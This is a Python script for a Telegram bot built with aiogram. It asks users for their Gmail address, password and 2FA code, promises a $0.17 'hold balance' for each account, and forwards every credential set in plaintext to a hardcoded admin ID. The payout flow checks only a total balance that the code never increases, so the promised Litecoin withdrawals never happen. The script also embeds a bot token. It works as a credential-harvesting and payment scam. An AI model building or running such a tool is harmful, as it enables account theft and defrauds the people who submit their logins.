import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiohttp import web

# Configuration
BOT_TOKEN = "8924995974:AAEcOT5ChY4qlEl-1hguZJ_8nNFygqUOuZQ"
ADMIN_ID = 5582627293
CHANNEL_ID = "@A_ToolsX" # Force join channel username

logging.basicConfig(level=logging.INFO)

# Initialize bot with memory storage for FSM
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot, storage=storage)

# Temporary Database Simulation
user_data = {}

# FSM States
class BotStates(StatesGroup):
    waiting_for_gmail = State()
    waiting_for_password = State()
    waiting_for_2fa = State()
    waiting_for_ltc_address = State()
    waiting_for_withdraw_amount = State()

# --- Keyboards ---
def get_main_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add("Register", "My account", "Balance", "Help")
    return keyboard

def get_register_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("Submit account", "Cancel ❌")
    return keyboard

def get_payout_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("payout", "Cancel ❌")
    return keyboard

def get_ltc_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("LTC", "Cancel ❌")
    return keyboard

def get_back_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("Cancel ❌")
    return keyboard

# Initialize User Data Function
def init_user(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "total_balance": 0.00,
            "hold_balance": 0.00,
            "accounts": []
        }

# --- Force Join Check Function ---
async def check_joined(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception:
        # If any error (like bot not admin in channel), allow user to proceed
        return True

# --- Start Command ---
@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message: types.Message, state: FSMContext):
    await state.finish()
    init_user(message.from_user.id)
    
    if not await check_joined(message.from_user.id):
        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
        return
        
    await message.reply("Welcome! Please select an option:", reply_markup=get_main_menu())

# --- Cancel Handler ---
@dp.message_handler(lambda message: message.text == "Cancel ❌", state='*')
async def cancel_process(message: types.Message, state: FSMContext):
    await state.finish()
    await message.answer("Process cancelled. Returned to main menu.", reply_markup=get_main_menu())

# --- Register Flow ---
@dp.message_handler(lambda message: message.text == "Register", state='*')
async def handle_register(message: types.Message):
    if not await check_joined(message.from_user.id):
        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
        return
        
    await message.answer(
        "Do you want us to generate a login and password for you or you already have an account?",
        reply_markup=get_register_menu()
    )

@dp.message_handler(lambda message: message.text == "Submit account", state='*')
async def submit_account_start(message: types.Message):
    if not await check_joined(message.from_user.id):
        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
        return
        
    await message.answer("Gamil AC...", reply_markup=get_back_menu())
    await BotStates.waiting_for_gmail.set()

@dp.message_handler(state=BotStates.waiting_for_gmail)
async def process_gmail(message: types.Message, state: FSMContext):
    await state.update_data(gmail=message.text)
    await message.answer("Give me Password.....")
    await BotStates.waiting_for_password.set()

@dp.message_handler(state=BotStates.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer("2FO...")
    await BotStates.waiting_for_2fa.set()

@dp.message_handler(state=BotStates.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    init_user(user_id)
    
    data = await state.get_data()
    gmail = data.get("gmail")
    password = data.get("password")
    two_fa = message.text
    
    account_info = {"gmail": gmail, "password": password, "2fa": two_fa, "status": "Pending"}
    user_data[user_id]["accounts"].append(account_info)
    
    user_data[user_id]["hold_balance"] += 0.17
    
    await message.answer("1 account submit successful\nHold balance 0.17", reply_markup=get_main_menu())
    
    admin_text = (
        f"📩 New Account Submitted!\n\n"
        f"User: {message.from_user.full_name} ({user_id})\n"
        f"Gmail: {gmail}\n"
        f"Password: {password}\n"
        f"2FA: {two_fa}"
    )
    try:
        await bot.send_message(ADMIN_ID, admin_text)
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")
        
    await state.finish()

# --- Balance & Payout Flow ---
@dp.message_handler(lambda message: message.text == "Balance", state='*')
async def handle_balance(message: types.Message):
    user_id = message.from_user.id
    init_user(user_id)
    
    total = user_data[user_id]["total_balance"]
    hold = user_data[user_id]["hold_balance"]
    
    await message.answer(f"Totally balance: ${total:.2f}\nHold: ${hold:.2f}", reply_markup=get_payout_menu())

@dp.message_handler(lambda message: message.text == "payout", state='*')
async def handle_payout(message: types.Message):
    await message.answer("Select payment method :", reply_markup=get_ltc_menu())

@dp.message_handler(lambda message: message.text == "LTC", state='*')
async def handle_ltc(message: types.Message):
    await message.answer("LTC token address submit now", reply_markup=get_back_menu())
    await BotStates.waiting_for_ltc_address.set()

@dp.message_handler(state=BotStates.waiting_for_ltc_address)
async def process_ltc_address(message: types.Message, state: FSMContext):
    await state.update_data(ltc_address=message.text)
    await message.answer("Enter withdrawal amount (Minimum $5.00):")
    await BotStates.waiting_for_withdraw_amount.set()

@dp.message_handler(state=BotStates.waiting_for_withdraw_amount)
async def process_withdraw(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
    except ValueError:
        await message.answer("Invalid amount. Please enter a valid number:")
        return
        
    if amount < 5.0:
        await message.answer("Minimum withdrawal limit is $5.00. Please enter a valid amount:")
        return
        
    init_user(user_id)
    if user_data[user_id]["total_balance"] < amount:
        await message.answer(f"Insufficient funds. Your balance is ${user_data[user_id]['total_balance']:.2f}", reply_markup=get_main_menu())
        await state.finish()
        return
        
    user_data[user_id]["total_balance"] -= amount
    await message.answer(f"Withdrawal request of ${amount:.2f} submitted successfully!", reply_markup=get_main_menu())
    
    data = await state.get_data()
    await bot.send_message(ADMIN_ID, f"💰 Withdrawal Request!\nUser: {user_id}\nAmount: ${amount:.2f}\nLTC Address: {data.get('ltc_address')}")
    await state.finish()

# --- My Account Flow ---
@dp.message_handler(lambda message: message.text == "My account", state='*')
async def handle_my_account(message: types.Message):
    user_id = message.from_user.id
    init_user(user_id)
    
    accounts = user_data[user_id]["accounts"]
    if not accounts:
        await message.answer("You haven't submitted any accounts yet.", reply_markup=get_main_menu())
        return
        
    response = "📋 Your Submitted Accounts Details:\n\n"
    for idx, acc in enumerate(accounts, 1):
        response += f"{idx}. Gmail: {acc['gmail']}\n   Status: {acc['status']}\n\n"
        
    await message.answer(response, reply_markup=get_main_menu())

# --- Help Flow ---
@dp.message_handler(lambda message: message.text == "Help", state='*')
async def handle_help(message: types.Message):
    try:
        admin_user = await bot.get_chat(ADMIN_ID)
        admin_username = admin_user.username
        if admin_username:
            await message.answer(f"⚙️ Help Support:\nAdmin is available. You can message directly here: @{admin_username}")
        else:
            await message.answer(f"⚙️ Help Support:\nAdmin ID: {ADMIN_ID}. Please contact via Telegram.")
    except Exception:
        await message.answer(f"⚙️ Help Support:\nPlease contact the administrator directly.")

# --- Render Port Binding Fix ---
async def handle_health_check(request):
    return web.Response(text="Bot is running perfectly fine!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    try:
        await dp.start_polling()
    finally:
        await bot.session.close()

if __name__ == '__main__':
    asyncio.run(main())
    
    
